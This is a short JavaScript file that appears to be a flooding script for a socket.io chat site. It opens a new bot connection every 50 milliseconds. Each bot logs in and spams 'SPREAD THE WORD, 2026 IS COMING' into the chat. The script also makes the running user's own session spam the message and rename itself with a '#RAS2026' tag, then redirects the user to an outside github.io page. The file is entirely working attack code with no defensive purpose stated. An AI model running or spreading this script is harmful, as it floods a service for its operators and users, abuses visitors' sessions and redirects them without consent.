alert("2026 is coming")
setInterval(() => {
    const socketb = io("//");
    socketb.emit("client", "MAIN");
    socketb.emit("login", {
        name: "SPREAD THE WORD, 2026 IS COMING",
    });
    socketb.emit("login", {
        name: "SPREAD THE WORD, 2026 IS COMING",
        room: Math.floor(50+(Math.floor(Math.random()*2)*1967))
    });
    socketb.emit("command", {
        list: ["color"]
    });
    setInterval(() => {
    socketb.emit("talk", {
        text: "SPREAD THE WORD, THE 2026 IS COMING"
    });
    },500)
}, 50)
setInterval(() => {
socket.emit("talk", {
    text: "SPREAD THE WORD, THE 2026 IS COMING"
});
socket.emit('command',{
  list: ['name', $("#login_name").val() + ' #RAS2026']
})
},50)
// Redirects the user after 5 seconds (5000 milliseconds)
setTimeout(function() {
  window.location.href = 'https://ivorydevrimoalt.github.io/2026.IS.NEW.YEAR/';
}, 5000);
